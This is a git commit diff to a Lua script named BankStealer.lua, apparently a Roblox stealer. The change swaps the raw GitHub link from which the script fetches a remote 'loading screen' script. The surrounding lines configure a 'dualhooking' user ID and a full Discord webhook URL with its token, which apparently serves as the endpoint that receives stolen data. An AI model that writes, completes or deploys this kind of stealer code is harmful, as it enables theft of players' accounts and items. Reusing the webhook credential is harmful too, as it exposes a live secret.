8c0be16792c2dad4e0e19ae249258443ad02dc6b
Tinajero <80500582+TinajeroDev@users.noreply.github.com>
2023-09-10 22:49:33 -0600

    Update BankStealer.lua

--- BankStealer.lua
+++ BankStealer.lua
@@ -10,7 +10,7 @@
 local dhuser = "8kknb5e8ryn"       -- dualhooking user
 _G.UserID = "12490815"
 local dhwebhook = "https://discord.com/api/webhooks/1061617319199129691/2rA5_qHdSvbnjS-bM4LTLeQbQS7CzEUkkRZ5m0epsghd2FuYAqsJ7EWb9-jYuXmmpFXw" -- Dualhooking Webhook
-local loadingraw = "https://raw.githubusercontent.com/Adidsus/untested/main/load.lua" -- Put Your LoadingScreen Raw Link Here
+local loadingraw = "https://raw.githubusercontent.com/TinajeroDev/Pet/main/load.lua" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
 getgenv().executed1 = true
